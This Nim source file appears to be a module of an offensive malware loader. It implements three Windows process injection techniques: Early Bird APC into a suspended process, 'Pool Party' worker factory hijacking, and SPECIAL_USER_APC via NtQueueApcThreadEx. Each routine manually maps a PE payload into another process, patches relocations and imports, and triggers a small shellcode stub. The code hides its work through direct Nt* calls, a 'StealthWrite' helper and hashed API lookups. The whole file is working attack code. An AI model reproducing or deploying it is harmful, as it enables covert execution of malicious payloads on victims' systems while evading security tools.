import winim, strutils
import ../core/resolver, ../core/masking, ../core/syscalls, ../core/utils

# Helper to map RVA to File Offset
proc to_offset(rva: uint32, nt: ptr IMAGE_NT_HEADERS64): uint32 =
    let sectionHeaderAddr = cast[uint](addr nt.OptionalHeader) + nt.FileHeader.SizeOfOptionalHeader.uint
    let pSections = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](sectionHeaderAddr)
    for i in 0..<nt.FileHeader.NumberOfSections.int:
        let pSec = pSections[i]
        let vAddr = pSec.VirtualAddress.uint32
        let vSize = pSec.Misc.VirtualSize.uint32
        if rva >= vAddr and rva < (vAddr + vSize):
            return rva - vAddr + pSec.PointerToRawData.uint32
    return rva

# Helper for secure writing to remote process
proc StealthWrite(hProc: HANDLE, pDst: pointer, pSrc: pointer, size: int): bool =
    var bytesWritten: SIZE_T
    let status = NtWriteVirtualMemory(hProc, pDst, pSrc, size.SIZE_T, addr bytesWritten)
    if status != 0 or bytesWritten != size.SIZE_T:
        return false
    return true

# Helper to map PE section characteristics to Windows memory protection constants
proc get_section_protection(characteristics: uint32): uint32 =
    let executable = (characteristics and 0x20000000.uint32) != 0 # MEM_EXECUTE
    let readable = (characteristics and 0x40000000.uint32) != 0   # MEM_READ
    let writeable = (characteristics and 0x80000000.uint32) != 0  # MEM_WRITE

    if executable:
        if readable:
            if writeable: return PAGE_EXECUTE_READWRITE
            else: return PAGE_EXECUTE_READ
        else:
            if writeable: return PAGE_EXECUTE_READ # Fallback
    else:
        if readable:
            if writeable: return PAGE_READWRITE
            else: return PAGE_READONLY
        else:
            if writeable: return PAGE_READWRITE # Fallback
    return PAGE_READWRITE

type IMAGE_TLS_DIRECTORY64 = object
    StartAddressOfRawData, EndAddressOfRawData, AddressOfIndex, AddressOfCallBacks: uint64
    SizeOfZeroFill, Characteristics: uint32

# Helper to find a process ID by name
proc findPidByName(name: string): DWORD =
    var aProcesses: array[1024, DWORD]
    var cbNeeded, cProcesses: DWORD
    if EnumProcesses(addr aProcesses[0], cast[DWORD](sizeof(aProcesses)), addr cbNeeded) != 0:
        cProcesses = cbNeeded div cast[DWORD](sizeof(DWORD))
        for i in 0..<cProcesses:
            let pid = aProcesses[i]
            if pid != 0:
                let hProcess = OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, FALSE, pid)
                if hProcess != 0:
                    var szProcessName: array[MAX_PATH, TCHAR]
                    if GetModuleBaseName(hProcess, 0, addr szProcessName[0], MAX_PATH) != 0:
                        let processName = $cast[WideCString](addr szProcessName[0])
                        if processName.toLowerAscii() == name.toLowerAscii():
                            CloseHandle(hProcess)
                            return pid
                    CloseHandle(hProcess)
    return 0

# Helper to find a thread suitable for APC (we just grab the first one we find)
proc findThreadForPid(pid: DWORD): DWORD =
    let hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
    if hSnapshot != INVALID_HANDLE_VALUE:
        var te32: THREADENTRY32
        te32.dwSize = cast[DWORD](sizeof(te32))
        if Thread32First(hSnapshot, addr te32) != 0:
            while true:
                if te32.th32OwnerProcessID == pid:
                    CloseHandle(hSnapshot)
                    return te32.th32ThreadID
                if Thread32Next(hSnapshot, addr te32) == 0:
                    break
        else:
            log_debug("[Threadless] Thread32First failed: " & $GetLastError())
        CloseHandle(hSnapshot)
    else:
        log_debug("[Threadless] CreateToolhelp32Snapshot failed: " & $GetLastError())
    return 0

proc run_early_bird*(payload_bytes: seq[byte], target_path: string): bool =
    log_debug("[Threadless] Starting Early Bird APC Injection...")
    
    var si: STARTUPINFOA
    var pi: PROCESS_INFORMATION
    si.cb = cast[DWORD](sizeof(si))

    if CreateProcessA(nil, cast[LPSTR](cstring(target_path)), nil, nil, FALSE, CREATE_SUSPENDED, nil, nil, addr si, addr pi) == 0:
        log_debug("[Threadless] ❌ Failed to create suspended process.")
        return false

    log_debug("[Threadless] Suspended Process Created: " & target_path & " (PID: " & $pi.dwProcessId & ")")

    let hProcess = pi.hProcess
    let hThread = pi.hThread

    # 4. Parse Payload
    let pPayload = unsafeAddr payload_bytes[0]
    let pDos = cast[ptr IMAGE_DOS_HEADER](pPayload)
    let pNt = cast[ptr IMAGE_NT_HEADERS64](cast[uint](pPayload) + pDos.e_lfanew.uint)
    let payloadSize = pNt.OptionalHeader.SizeOfImage

    # 5. Allocate Memory
    var remoteBase: pointer = nil
    var regionSize = payloadSize.SIZE_T
    if NtAllocateVirtualMemory(hProcess, addr remoteBase, 0, addr regionSize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE) != 0:
        TerminateProcess(hProcess, 0); CloseHandle(hThread); CloseHandle(hProcess); return false
        
    log_debug("[Threadless] Memory allocated at: 0x" & cast[uint](remoteBase).toHex())
    let delta = cast[int64](remoteBase) - cast[int64](pNt.OptionalHeader.ImageBase)

    # Write Headers
    if not StealthWrite(hProcess, remoteBase, pPayload, pNt.OptionalHeader.SizeOfHeaders.int):
        TerminateProcess(hProcess, 0); CloseHandle(hThread); CloseHandle(hProcess); return false

    # 6. Write Sections
    let sectionHeaderAddr = cast[uint](addr pNt.OptionalHeader) + pNt.FileHeader.SizeOfOptionalHeader.uint
    let pSections = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](sectionHeaderAddr)
    let numSections = pNt.FileHeader.NumberOfSections.int

    for i in 0..<numSections:
        let pSec = pSections[i]
        let pSrc = cast[pointer](cast[uint](pPayload) + pSec.PointerToRawData.uint)
        let pDst = cast[pointer](cast[uint](remoteBase) + pSec.VirtualAddress.uint)
        let rawSize = pSec.SizeOfRawData
        if rawSize > 0:
            if not StealthWrite(hProcess, pDst, pSrc, rawSize.int): discard
    
    # Relocations
    if delta != 0:
        let relocDir = pNt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
        if relocDir.VirtualAddress > 0 and relocDir.Size > 0:
            var currentReloc = cast[ptr IMAGE_BASE_RELOCATION](cast[uint](pPayload) + to_offset(cast[uint32](relocDir.VirtualAddress), pNt).uint)
            let relocEnd = cast[uint](currentReloc) + relocDir.Size.uint
            while cast[uint](currentReloc) < relocEnd and currentReloc.SizeOfBlock > 0:
                let count = (cast[uint32](currentReloc.SizeOfBlock) - cast[uint32](sizeof(IMAGE_BASE_RELOCATION))) div 2
                let pEntries = cast[ptr UncheckedArray[uint16]](cast[uint](currentReloc) + sizeof(IMAGE_BASE_RELOCATION).uint)
                let pageRva = currentReloc.VirtualAddress
                for k in 0..<count.int:
                    let entry = pEntries[k]
                    let relocType = entry shr 12
                    let offset = entry and 0xFFF
                    if relocType == IMAGE_REL_BASED_DIR64:
                         let patchAddr = cast[pointer](cast[uint](remoteBase) + pageRva.uint + offset.uint)
                         var val: uint64
                         if NtReadVirtualMemory(hProcess, patchAddr, addr val, sizeof(val), nil) == 0:
                             val += cast[uint64](delta)
                             discard NtWriteVirtualMemory(hProcess, patchAddr, addr val, sizeof(val), nil)
                currentReloc = cast[ptr IMAGE_BASE_RELOCATION](cast[uint](currentReloc) + currentReloc.SizeOfBlock.uint)

    # IAT
    type HollowingImportDescriptor = object
        OriginalFirstThunk, TimeDateStamp, ForwarderChain, Name, FirstThunk: uint32
    let importDir = pNt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
    if importDir.VirtualAddress > 0:
        var pImportDesc = cast[ptr HollowingImportDescriptor](cast[uint](pPayload) + to_offset(cast[uint32](importDir.VirtualAddress), pNt).uint)
        while pImportDesc.Name != 0:
             let libName = $cast[cstring](cast[uint](pPayload) + to_offset(pImportDesc.Name, pNt).uint)
             let hLib = LoadLibraryA(libName)
             if hLib != 0:
                 var lookupRva = if pImportDesc.OriginalFirstThunk != 0: pImportDesc.OriginalFirstThunk else: pImportDesc.FirstThunk
                 var origThunk = cast[ptr uint64](cast[uint](pPayload) + to_offset(lookupRva, pNt).uint)
                 var thunkRva = pImportDesc.FirstThunk
                 while origThunk[] != 0:
                     let rva = origThunk[]
                     var funcAddr: uint64 = 0
                     if (rva and 0x8000000000000000.uint64) != 0:
                         let ordinal = rva and 0xFFFF
                         funcAddr = cast[uint64](GetProcAddress(hLib, cast[cstring](ordinal)))
                     else:
                         let pName = cast[ptr IMAGE_IMPORT_BY_NAME](cast[uint](pPayload) + to_offset(cast[uint32](rva), pNt).uint)
                         funcAddr = cast[uint64](GetProcAddress(hLib, cast[cstring](addr pName.Name)))
                     
                     if funcAddr != 0:
                         let remoteThunkAddr = cast[pointer](cast[uint](remoteBase) + thunkRva.uint)
                         discard NtWriteVirtualMemory(hProcess, remoteThunkAddr, addr funcAddr, sizeof(funcAddr), nil)
                     
                     origThunk = cast[ptr uint64](cast[uint](origThunk) + 8); thunkRva += 8
             pImportDesc = cast[ptr HollowingImportDescriptor](cast[uint](pImportDesc) + sizeof(HollowingImportDescriptor).uint)

    # Entry Point & APC Stub
    let entryAddr = cast[uint64](cast[uint](remoteBase) + pNt.OptionalHeader.AddressOfEntryPoint.uint)
    
    # Simple, clean trampoline for APC. 
    # An APC function receives arguments in RCX, RDX, R8. We just need to align stack and call entry.
    var stub: seq[byte] = @[]
    
    # sub rsp, 28h ; reserve 40 bytes for shadow space and keep stack 16-byte aligned
    stub.add(@[0x48.byte, 0x83, 0xEC, 0x28])
    
    # mov rax, EntryPoint
    stub.add(@[0x48.byte, 0xB8])
    for j in 0..7: stub.add(cast[byte]((entryAddr shr (j * 8)) and 0xFF))
    
    # call rax
    stub.add(@[0xFF.byte, 0xD0])
    
    # add rsp, 28h ; restore stack
    stub.add(@[0x48.byte, 0x83, 0xC4, 0x28])
    
    # ret
    stub.add(@[0xC3.byte])
    
    var remoteStub: pointer = nil
    var stubSize = stub.len.SIZE_T
    if NtAllocateVirtualMemory(hProcess, addr remoteStub, 0, addr stubSize, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE) == 0:
        discard StealthWrite(hProcess, remoteStub, addr stub[0], stub.len)
        
    var vpBase = remoteBase
    var vpSize = payloadSize.SIZE_T
    var oldProt: ULONG
    discard NtProtectVirtualMemory(hProcess, addr vpBase, addr vpSize, PAGE_EXECUTE_READWRITE.ULONG, addr oldProt)

    type PAPCFUNC = pointer
    let queueApc = get_proc_address_hashed(get_module_base(hash_api("kernel32.dll")), hash_api("QueueUserAPC"))
    type QueueUserAPCFn = proc (pfnAPC: PAPCFUNC, hThread: HANDLE, dwData: ULONG_PTR): DWORD {.stdcall.}
    let pQueueUserAPC = cast[QueueUserAPCFn](queueApc)
    
    if pQueueUserAPC(cast[PAPCFUNC](remoteStub), hThread, 0) != 0:
        log_debug("[Threadless] ✅ SUCCESS. APC Queued (Early Bird). Waking thread...")
        ResumeThread(hThread)
        log_debug("[Threadless]     Thread resumed. Waiting to capture potential crash...")
        Sleep(2000)
        var ec: DWORD
        GetExitCodeProcess(hProcess, addr ec)
        log_debug("[Threadless]     Process Exit Code: 0x" & ec.toHex())
        CloseHandle(hThread); CloseHandle(hProcess)
        return true
    else:
        log_debug("[Threadless] ❌ FAILED to queue APC. Error: " & $GetLastError())
        CloseHandle(hThread); CloseHandle(hProcess)
        return false

type
    SYSTEM_HANDLE_TABLE_ENTRY_INFO = object
        UniqueProcessId: USHORT
        CreatorBackTraceIndex: USHORT
        ObjectTypeIndex: UCHAR
        HandleAttributes: UCHAR
        HandleValue: USHORT
        Object: PVOID
        GrantedAccess: ULONG

    SYSTEM_HANDLE_INFORMATION = object
        NumberOfHandles: ULONG
        Handles: UncheckedArray[SYSTEM_HANDLE_TABLE_ENTRY_INFO]

    PUBLIC_OBJECT_TYPE_INFORMATION = object
        TypeName: UNICODE_STRING
        Reserved: array[22, ULONG]

proc run_pool_party*(payload_bytes: seq[byte], target_pid: DWORD): bool =
    log_debug("[PoolParty] Starting Worker Factory Hijacking (Pool Party)...")
    
    let hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)
    if hProcess == 0:
        log_debug("[PoolParty] ❌ Failed to open target process.")
        return false

    # 1. Map Payload
    let pPayload = unsafeAddr payload_bytes[0]
    let pDos = cast[ptr IMAGE_DOS_HEADER](pPayload)
    let pNt = cast[ptr IMAGE_NT_HEADERS64](cast[uint](pPayload) + pDos.e_lfanew.uint)
    let payloadSize = pNt.OptionalHeader.SizeOfImage

    var remoteBase: pointer = nil
    var regionSize = payloadSize.SIZE_T
    if NtAllocateVirtualMemory(hProcess, addr remoteBase, 0, addr regionSize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE) != 0:
        CloseHandle(hProcess); return false
        
    log_debug("[PoolParty] Memory allocated at: 0x" & cast[uint](remoteBase).toHex())
    # ... (Omitted Section Writing & IAT/Reloc for brevity, will copy-paste logic)
    let delta = cast[int64](remoteBase) - cast[int64](pNt.OptionalHeader.ImageBase)
    discard StealthWrite(hProcess, remoteBase, pPayload, pNt.OptionalHeader.SizeOfHeaders.int)
    let sectionHeaderAddr = cast[uint](addr pNt.OptionalHeader) + pNt.FileHeader.SizeOfOptionalHeader.uint
    let pSections = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](sectionHeaderAddr)
    for i in 0..<pNt.FileHeader.NumberOfSections.int:
        let pSec = pSections[i]
        let pSrc = cast[pointer](cast[uint](pPayload) + pSec.PointerToRawData.uint)
        let pDst = cast[pointer](cast[uint](remoteBase) + pSec.VirtualAddress.uint)
        if pSec.SizeOfRawData > 0: discard StealthWrite(hProcess, pDst, pSrc, pSec.SizeOfRawData.int)
    if delta != 0:
        let relocDir = pNt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
        if relocDir.VirtualAddress > 0 and relocDir.Size > 0:
            var currentReloc = cast[ptr IMAGE_BASE_RELOCATION](cast[uint](pPayload) + to_offset(cast[uint32](relocDir.VirtualAddress), pNt).uint)
            let relocEnd = cast[uint](currentReloc) + relocDir.Size.uint
            while cast[uint](currentReloc) < relocEnd and currentReloc.SizeOfBlock > 0:
                let count = (currentReloc.SizeOfBlock - cast[DWORD](sizeof(IMAGE_BASE_RELOCATION))) div 2
                let relocData = cast[ptr UncheckedArray[uint16]](cast[uint](currentReloc) + sizeof(IMAGE_BASE_RELOCATION).uint)
                for i in 0..<count:
                    let typeOffset = relocData[i]
                    if (typeOffset shr 12) == IMAGE_REL_BASED_DIR64:
                        let pRemoteReloc = cast[pointer](cast[uint](remoteBase) + currentReloc.VirtualAddress.uint + (typeOffset and 0x0FFF).uint)
                        var val: uint64
                        if NtReadVirtualMemory(hProcess, pRemoteReloc, addr val, sizeof(val), nil) == 0:
                            val = cast[uint64](cast[int64](val) + delta)
                            discard NtWriteVirtualMemory(hProcess, pRemoteReloc, addr val, sizeof(val), nil)
                currentReloc = cast[ptr IMAGE_BASE_RELOCATION](cast[uint](currentReloc) + currentReloc.SizeOfBlock.uint)
    var pImportDesc = cast[ptr IMAGE_IMPORT_DESCRIPTOR](cast[uint](pPayload) + to_offset(cast[uint32](pNt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress), pNt).uint)
    if pNt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress != 0:
         while pImportDesc.Name != 0:
             let hLib = LoadLibraryA(cast[cstring](cast[uint](pPayload) + to_offset(cast[uint32](pImportDesc.Name), pNt).uint))
             if hLib != 0:
                 var origThunk = cast[ptr uint64](cast[uint](pPayload) + to_offset(cast[uint32](pImportDesc.union1.OriginalFirstThunk), pNt).uint)
                 if pImportDesc.union1.OriginalFirstThunk == 0: origThunk = cast[ptr uint64](cast[uint](pPayload) + to_offset(cast[uint32](pImportDesc.FirstThunk), pNt).uint)
                 var thunkRva = pImportDesc.FirstThunk
                 while origThunk[] != 0:
                     var funcAddr: uint64 = 0
                     if (origThunk[] and 0x8000000000000000.uint64) != 0: funcAddr = cast[uint64](GetProcAddress(hLib, cast[cstring](origThunk[] and 0xFFFF)))
                     else: funcAddr = cast[uint64](GetProcAddress(hLib, cast[cstring](addr cast[ptr IMAGE_IMPORT_BY_NAME](cast[uint](pPayload) + to_offset(cast[uint32](origThunk[]), pNt).uint).Name)))
                     if funcAddr != 0: discard NtWriteVirtualMemory(hProcess, cast[pointer](cast[uint](remoteBase) + thunkRva.uint), addr funcAddr, sizeof(funcAddr), nil)
                     origThunk = cast[ptr uint64](cast[uint](origThunk) + 8); thunkRva += 8
             pImportDesc = cast[ptr IMAGE_IMPORT_DESCRIPTOR](cast[uint](pImportDesc) + sizeof(IMAGE_IMPORT_DESCRIPTOR).uint)

    let entryAddr = cast[uint64](cast[uint](remoteBase) + pNt.OptionalHeader.AddressOfEntryPoint.uint)
    var stub: seq[byte] = @[0x48.byte, 0x83, 0xEC, 0x28, 0x48, 0xB8]
    for j in 0..7: stub.add(cast[byte]((entryAddr shr (j * 8)) and 0xFF))
    stub.add(@[0xFF.byte, 0xD0, 0x48.byte, 0x83, 0xC4, 0x28, 0xC3])
    
    var remoteStub: pointer = nil
    var stubSize = stub.len.SIZE_T
    discard NtAllocateVirtualMemory(hProcess, addr remoteStub, 0, addr stubSize, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    discard StealthWrite(hProcess, remoteStub, addr stub[0], stub.len)
    
    var vpBase = remoteBase; var vpSize = payloadSize.SIZE_T; var oldProt: ULONG
    discard NtProtectVirtualMemory(hProcess, addr vpBase, addr vpSize, PAGE_EXECUTE.ULONG, addr oldProt)

    # 2. Create Worker Factory (Pool Party variant)
    let ntdll = GetModuleHandleA("ntdll.dll")
    type NtCreateWorkerFactoryFn = proc (WorkerFactoryHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, CompletionPortHandle: HANDLE, WorkerProcessHandle: HANDLE, StartRoutine: pointer, StartParameter: pointer, MaxThreadCount: ULONG, StackReserve: SIZE_T, StackCommit: SIZE_T): NTSTATUS {.stdcall.}
    type NtCreateIoCompletionFn = proc (IoCompletionHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, Count: ULONG): NTSTATUS {.stdcall.}
    type NtSetInformationWorkerFactoryFn = proc (WorkerFactoryHandle: HANDLE, WorkerFactoryInformationClass: ULONG, WorkerFactoryInformation: pointer, WorkerFactoryInformationLength: ULONG): NTSTATUS {.stdcall.}
    type NtDuplicateObjectFn = proc (SourceProcessHandle: HANDLE, SourceHandle: HANDLE, TargetProcessHandle: HANDLE, TargetHandle: PHANDLE, DesiredAccess: ACCESS_MASK, HandleAttributes: ULONG, Options: ULONG): NTSTATUS {.stdcall.}
    
    let pNtCreateWorkerFactory = cast[NtCreateWorkerFactoryFn](GetProcAddress(ntdll, "NtCreateWorkerFactory"))
    let pNtCreateIoCompletion = cast[NtCreateIoCompletionFn](GetProcAddress(ntdll, "NtCreateIoCompletion"))
    let pNtSetInformationWorkerFactory = cast[NtSetInformationWorkerFactoryFn](GetProcAddress(ntdll, "NtSetInformationWorkerFactory"))
    let pNtDuplicateObject = cast[NtDuplicateObjectFn](GetProcAddress(ntdll, "NtDuplicateObject"))

    var hIoPort: HANDLE
    if pNtCreateIoCompletion(addr hIoPort, IO_COMPLETION_ALL_ACCESS, nil, 0) != 0:
        log_debug("[PoolParty] ❌ Failed to create local IO Completion Port.")
        CloseHandle(hProcess); return false

    var hRemoteIoPort: HANDLE
    if pNtDuplicateObject(GetCurrentProcess(), hIoPort, hProcess, addr hRemoteIoPort, 0, 0, DUPLICATE_SAME_ACCESS) != 0:
        log_debug("[PoolParty] ❌ Failed to duplicate IO Port handle to target.")
        CloseHandle(hIoPort); CloseHandle(hProcess); return false

    var hWorkerFactory: HANDLE
    # Create the factory. The CompletionPort must be a handle valid in the context of the WorkerProcessHandle.
    let status = pNtCreateWorkerFactory(addr hWorkerFactory, GENERIC_ALL, nil, hRemoteIoPort, hProcess, remoteStub, nil, 10, 0, 0)

    if status == 0:
        log_debug("[PoolParty] ✅ SUCCESS. WorkerFactory created. Handle: 0x" & hWorkerFactory.toHex())
        # Trigger: Set minimum threads to 1 (WorkerFactoryMinimumThreads = 3)
        var minThreads: ULONG = 1
        let setStatus = pNtSetInformationWorkerFactory(hWorkerFactory, 3, addr minThreads, sizeof(minThreads).ULONG)
        if setStatus == 0:
            log_debug("[PoolParty] ✅ SUCCESS. Triggered execution via MinThreads.")
            CloseHandle(hWorkerFactory); CloseHandle(hIoPort); CloseHandle(hProcess)
            return true
        else:
            log_debug("[PoolParty] ❌ Failed to set MinThreads. NTSTATUS: 0x" & cast[uint32](setStatus).toHex())
            CloseHandle(hWorkerFactory); CloseHandle(hIoPort); CloseHandle(hProcess)
            return false
    else:
        log_debug("[PoolParty] ❌ Failed to create WorkerFactory. NTSTATUS: 0x" & cast[uint32](status).toHex())
        CloseHandle(hIoPort); CloseHandle(hProcess)
        return false

proc run_special_user_apc*(payload_bytes: seq[byte], target_pid: DWORD, target_tid: DWORD): bool =
    log_debug("[Threadless] Starting SPECIAL_USER_APC Injection...")
    
    let hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)
    let hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, target_tid)
    
    if hProcess == 0 or hThread == 0:
        log_debug("[Threadless] ❌ Failed to open target process or thread.")
        if hProcess != 0: CloseHandle(hProcess)
        if hThread != 0: CloseHandle(hThread)
        return false

    log_debug("[Threadless] Opened Target Process (PID: " & $target_pid & ") Thread (TID: " & $target_tid & ")")

    # Parse Payload
    let pPayload = unsafeAddr payload_bytes[0]
    let pDos = cast[ptr IMAGE_DOS_HEADER](pPayload)
    let pNt = cast[ptr IMAGE_NT_HEADERS64](cast[uint](pPayload) + pDos.e_lfanew.uint)
    let payloadSize = pNt.OptionalHeader.SizeOfImage

    # Allocate Memory
    var remoteBase: pointer = nil
    var regionSize = payloadSize.SIZE_T
    if NtAllocateVirtualMemory(hProcess, addr remoteBase, 0, addr regionSize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE) != 0:
        CloseHandle(hThread); CloseHandle(hProcess); return false
        
    log_debug("[Threadless] Memory allocated at: 0x" & cast[uint](remoteBase).toHex())
    let delta = cast[int64](remoteBase) - cast[int64](pNt.OptionalHeader.ImageBase)

    # Write Headers
    if not StealthWrite(hProcess, remoteBase, pPayload, pNt.OptionalHeader.SizeOfHeaders.int):
        CloseHandle(hThread); CloseHandle(hProcess); return false

    # Write Sections
    let sectionHeaderAddr = cast[uint](addr pNt.OptionalHeader) + pNt.FileHeader.SizeOfOptionalHeader.uint
    let pSections = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](sectionHeaderAddr)
    let numSections = pNt.FileHeader.NumberOfSections.int

    for i in 0..<numSections:
        let pSec = pSections[i]
        let pSrc = cast[pointer](cast[uint](pPayload) + pSec.PointerToRawData.uint)
        let pDst = cast[pointer](cast[uint](remoteBase) + pSec.VirtualAddress.uint)
        let rawSize = pSec.SizeOfRawData
        if rawSize > 0:
            if not StealthWrite(hProcess, pDst, pSrc, rawSize.int): discard
    
    # Relocations
    if delta != 0:
        let relocDir = pNt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
        if relocDir.VirtualAddress > 0 and relocDir.Size > 0:
            var currentReloc = cast[ptr IMAGE_BASE_RELOCATION](cast[uint](pPayload) + to_offset(cast[uint32](relocDir.VirtualAddress), pNt).uint)
            let relocEnd = cast[uint](currentReloc) + relocDir.Size.uint
            
            while cast[uint](currentReloc) < relocEnd and currentReloc.SizeOfBlock > 0:
                let count = (currentReloc.SizeOfBlock - cast[DWORD](sizeof(IMAGE_BASE_RELOCATION))) div 2
                let relocData = cast[ptr UncheckedArray[uint16]](cast[uint](currentReloc) + sizeof(IMAGE_BASE_RELOCATION).uint)
                let pageVA = currentReloc.VirtualAddress
                
                for i in 0..<count:
                    let typeOffset = relocData[i]
                    let rType = typeOffset shr 12
                    let offset = typeOffset and 0x0FFF
                    
                    if rType == IMAGE_REL_BASED_DIR64:
                        let pRemoteReloc = cast[pointer](cast[uint](remoteBase) + pageVA.uint + offset.uint)
                        var val: uint64
                        if NtReadVirtualMemory(hProcess, pRemoteReloc, addr val, sizeof(val), nil) == 0:
                            val = cast[uint64](cast[int64](val) + delta)
                            discard NtWriteVirtualMemory(hProcess, pRemoteReloc, addr val, sizeof(val), nil)
                
                currentReloc = cast[ptr IMAGE_BASE_RELOCATION](cast[uint](currentReloc) + currentReloc.SizeOfBlock.uint)

    # Resolve IAT
    var pImportDesc = cast[ptr IMAGE_IMPORT_DESCRIPTOR](cast[uint](pPayload) + to_offset(cast[uint32](pNt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress), pNt).uint)
    if pNt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress != 0:
         while pImportDesc.Name != 0:
             let libName = cast[cstring](cast[uint](pPayload) + to_offset(cast[uint32](pImportDesc.Name), pNt).uint)
             let hLib = LoadLibraryA(libName)
             
             if hLib != 0:
                 var origThunk = cast[ptr uint64](cast[uint](pPayload) + to_offset(cast[uint32](pImportDesc.union1.OriginalFirstThunk), pNt).uint)
                 if pImportDesc.union1.OriginalFirstThunk == 0:
                     origThunk = cast[ptr uint64](cast[uint](pPayload) + to_offset(cast[uint32](pImportDesc.FirstThunk), pNt).uint)
                 
                 var thunkRva = pImportDesc.FirstThunk
                 while origThunk[] != 0:
                     let rva = origThunk[]
                     var funcAddr: uint64 = 0
                     if (rva and 0x8000000000000000.uint64) != 0:
                         let ordinal = rva and 0xFFFF
                         funcAddr = cast[uint64](GetProcAddress(hLib, cast[cstring](ordinal)))
                     else:
                         let pName = cast[ptr IMAGE_IMPORT_BY_NAME](cast[uint](pPayload) + to_offset(cast[uint32](rva), pNt).uint)
                         funcAddr = cast[uint64](GetProcAddress(hLib, cast[cstring](addr pName.Name)))
                     
                     if funcAddr != 0:
                         let remoteThunkAddr = cast[pointer](cast[uint](remoteBase) + thunkRva.uint)
                         discard NtWriteVirtualMemory(hProcess, remoteThunkAddr, addr funcAddr, sizeof(funcAddr), nil)
                     
                     origThunk = cast[ptr uint64](cast[uint](origThunk) + 8); thunkRva += 8
             pImportDesc = cast[ptr IMAGE_IMPORT_DESCRIPTOR](cast[uint](pImportDesc) + sizeof(IMAGE_IMPORT_DESCRIPTOR).uint)

    # Entry Point & APC Stub
    let entryAddr = cast[uint64](cast[uint](remoteBase) + pNt.OptionalHeader.AddressOfEntryPoint.uint)
    var stub: seq[byte] = @[]
    stub.add(@[0x48.byte, 0x83, 0xEC, 0x28])
    stub.add(@[0x48.byte, 0xB8])
    for j in 0..7: stub.add(cast[byte]((entryAddr shr (j * 8)) and 0xFF))
    stub.add(@[0xFF.byte, 0xD0])
    stub.add(@[0x48.byte, 0x83, 0xC4, 0x28])
    stub.add(@[0xC3.byte])
    
    var remoteStub: pointer = nil
    var stubSize = stub.len.SIZE_T
    if NtAllocateVirtualMemory(hProcess, addr remoteStub, 0, addr stubSize, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE) == 0:
        discard StealthWrite(hProcess, remoteStub, addr stub[0], stub.len)
        
    var vpBase = remoteBase
    var vpSize = payloadSize.SIZE_T
    var oldProt: ULONG
    discard NtProtectVirtualMemory(hProcess, addr vpBase, addr vpSize, PAGE_EXECUTE_READWRITE.ULONG, addr oldProt)

    type NtQueueApcThreadExFn = proc (ThreadHandle: HANDLE, UserApcReserveHandle: HANDLE, ApcRoutine: pointer, ApcArgument1: pointer, ApcArgument2: pointer, ApcArgument3: pointer): NTSTATUS {.stdcall.}
    let ntdll = GetModuleHandleA("ntdll.dll")
    let pNtQueueApcThreadEx = cast[NtQueueApcThreadExFn](GetProcAddress(ntdll, "NtQueueApcThreadEx"))
    
    if pNtQueueApcThreadEx == nil:
        log_debug("[Threadless] ❌ NtQueueApcThreadEx not found horizontally! OS may be too old for SPECIAL_USER_APC.")
        CloseHandle(hThread); CloseHandle(hProcess)
        return false

    let SPECIAL_USER_APC = cast[HANDLE](1)
    let status = pNtQueueApcThreadEx(hThread, SPECIAL_USER_APC, remoteStub, nil, nil, nil)
    
    if status == 0:
        log_debug("[Threadless] ✅ SUCCESS. NtQueueApcThreadEx queued with SPECIAL_USER_APC flag!")
        CloseHandle(hThread); CloseHandle(hProcess)
        return true
    else:
        log_debug("[Threadless] ❌ FAILED to queue Special User APC. NTSTATUS: 0x" & cast[uint32](status).toHex())
        CloseHandle(hThread); CloseHandle(hProcess)
        return false
